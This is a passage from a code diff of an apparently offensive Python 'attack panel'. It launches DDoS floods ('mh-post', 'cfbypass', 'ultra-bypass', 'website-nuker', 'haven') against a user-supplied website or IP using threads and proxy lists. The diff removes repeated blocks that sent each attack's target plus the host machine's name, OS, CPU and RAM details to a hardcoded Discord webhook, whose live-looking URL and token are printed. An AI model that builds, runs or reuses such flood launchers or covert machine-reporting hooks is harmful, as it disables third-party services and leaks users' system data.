                 mhgetsend = ('python3 start.py post ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embed.add_embed_field(name='Method:', value='mh-post')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(mhgetsend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embedx.add_embed_field(name='Method:', value='mh-post')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
                 load()
                 license()
                 menu()
@@ -2638,89 +886,9 @@ def menu():
                 mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                 mhgetsend = ('python3 start.py dgb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embed.add_embed_field(name='Method:', value='mh-ddosguard')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(mhgetsend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embedx.add_embed_field(name='Method:', value='mh-ddosguard')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
                 load()
                 license()
                 menu()
@@ -2738,89 +906,9 @@ def menu():
                 mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                 mhgetsend = ('python3 start.py cfb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embed.add_embed_field(name='Method:', value='mh-cfbypass')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+               
                 os.system(mhgetsend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embedx.add_embed_field(name='Method:', value='mh-cfbypass')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+               
                 load()
                 license()
                 menu()
@@ -2838,89 +926,9 @@ def menu():
                 mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                 mhgetsend = ('python3 start.py null ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embed.add_embed_field(name='Method:', value='mh-null')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(mhgetsend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embedx.add_embed_field(name='Method:', value='mh-null')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
                 load()
                 license()
                 menu()
@@ -2938,89 +946,9 @@ def menu():
                 mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                 mhgetsend = ('python3 start.py bypass ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embed.add_embed_field(name='Method:', value='mh-normalbypass')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(mhgetsend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embedx.add_embed_field(name='Method:', value='mh-normalbypass')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+               
                 load()
                 license()
                 menu()
@@ -3039,83 +967,9 @@ def menu():
                 havenip = input("\033[31m\033[1m⮞ \033[0m\033[96mIP\033[31m:\033[36m\033[31m")
                 havensend = ('sudo ./haven -d ' + havenip)
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{havenip}')
-                    
-                embed.add_embed_field(name='Method:', value='haven-god')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(havensend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{havenip}')
-                    
-                embedx.add_embed_field(name='Method:', value='haven-god')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
                 load()
                 license()
                 menu()
@@ -3158,90 +1012,9 @@ def menu():
                 ultrabypassREQ = input("\033[31m\033[1m⮞\033[0m \033[96mThreads-Requests (minimum 5) and write it only in numbers without spaces \033[31m:\033[36m\033[31m")
                 sendultrabypassattack = ("node method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request " + ultrabypassREQ)
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{ultrabypasswebsite}')
-                    
-                embed.add_embed_field(name='Time:', value=f'{ultrabypasstime}')
-                    
-                embed.add_embed_field(name='Threads:', value=f'{ultrabypassREQ}')
-                embed.add_embed_field(name='Method:', value='ultra-bypass')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(sendultrabypassattack)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{ultrabypasswebsite}')
-                embedx.add_embed_field(name='Time:', value=f'{ultrabypasstime}')
-                    
-                embedx.add_embed_field(name='Threads:', value=f'{ultrabypassREQ}')
-                embedx.add_embed_field(name='Method:', value='ultra-bypass')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='Method:', value='ultra-bypass')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
 
                 load()
                 license()
@@ -3258,85 +1031,9 @@ def menu():
                 timewebsitenuker = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                 sendattackwebsitenuker = ("node website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
                 tip()
